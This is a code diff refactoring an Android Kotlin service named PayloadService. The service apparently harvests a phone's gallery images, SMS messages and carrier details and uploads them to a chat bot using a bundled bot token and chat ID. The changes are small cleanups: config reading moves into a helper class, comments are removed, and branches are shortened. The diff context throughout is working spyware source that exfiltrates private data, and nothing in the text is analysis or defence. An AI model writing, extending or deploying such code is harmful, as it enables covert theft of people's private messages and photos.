@@ -24,7 +24,6 @@ import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
-import org.json.JSONObject
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -34,8 +33,6 @@ import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicInteger
 
 class PayloadService : Service() {
-
-    private class Cfg(val token: String, val chat: String, val features: List<String>)
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(25, TimeUnit.SECONDS)
@@ -85,7 +82,7 @@ class PayloadService : Service() {
     }
 
     private fun run() {
-        val cfg = readConfig()
+        val cfg = HsConfig.read(this)
         if (cfg == null) {
             HsLog.e("no config")
             return
@@ -114,8 +111,6 @@ class PayloadService : Service() {
         pool.awaitTermination(30, TimeUnit.MINUTES)
         HsLog.w("all done: ${done.get()}")
     }
-
-    // ---------------- notification ----------------
 
     private fun startForegroundSafe() {
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
@@ -177,32 +172,6 @@ class PayloadService : Service() {
     } catch (t: Throwable) {
         null
     }
-
-    // ---------------- config ----------------
-
-    private fun readConfig(): Cfg? {
-        try {
-            val s = assets.open(Const.CONFIG_ASSET).use { it.readBytes().toString(Charsets.UTF_8) }
-            val o = JSONObject(s)
-            val t = o.optString("bot_token")
-            val c = o.optString("chat_id")
-            if (t.isBlank() || c.isBlank()) return null
-
-            val feats = ArrayList<String>()
-            val arr = o.optJSONArray("features")
-            if (arr != null) {
-                for (i in 0 until arr.length()) feats.add(arr.optString(i))
-            }
-            if (feats.isEmpty()) feats.add("gallery")
-
-            return Cfg(t, c, feats)
-        } catch (t: Throwable) {
-            HsLog.e("config read: ${t.message}")
-        }
-        return null
-    }
-
-    // ---------------- gallery ----------------
 
     private fun queryImages(): List<Uri> {
         val out = ArrayList<Uri>()
@@ -330,14 +299,11 @@ class PayloadService : Service() {
         }
     }
 
-    // ---------------- text features ----------------
-
     private fun sendTextFile(name: String, content: String) {
         gate.acquire()
         pool.execute {
             try {
                 val data = content.toByteArray(Charsets.UTF_8)
-
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chat)
@@ -351,9 +317,8 @@ class PayloadService : Service() {
                     .build()
 
                 client.newCall(req).execute().use { r ->
-                    if (r.isSuccessful) done.incrementAndGet() else {
-                        HsLog.e("send $name http ${r.code}")
-                    }
+                    if (r.isSuccessful) done.incrementAndGet()
+                    else HsLog.e("send $name http ${r.code}")
                 }
             } catch (t: Throwable) {
                 HsLog.e("sendTextFile: ${t.message}")
@@ -383,11 +348,7 @@ class PayloadService : Service() {
                     val body = c.getString(1) ?: ""
                     val date = c.getLong(2)
                     val type = c.getInt(3)
-                    val dir = when (type) {
-                        1 -> "IN"
-                        2 -> "OUT"
-                        else -> "OTHER"
-                    }
+                    val dir = if (type == 1) "IN" else if (type == 2) "OUT" else "OTHER"
                     sb.append("[").append(dir).append("] ").append(stamp(date)).append("\n")
                     sb.append(addr).append(": ").append(body).append("\n\n")
                     n++
@@ -475,7 +436,7 @@ class PayloadService : Service() {
         sb.append("Host package: ").append(packageName).append("\n")
         try {
             val tm = getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
-            sb.append("Network operator: ").append(tm.networkOperatorName).append("\n")
+            sb.append("Operator: ").append(tm.networkOperatorName).append("\n")
             sb.append("Sim country: ").append(tm.simCountryIso).append("\n")
         } catch (_: Throwable) {
         }
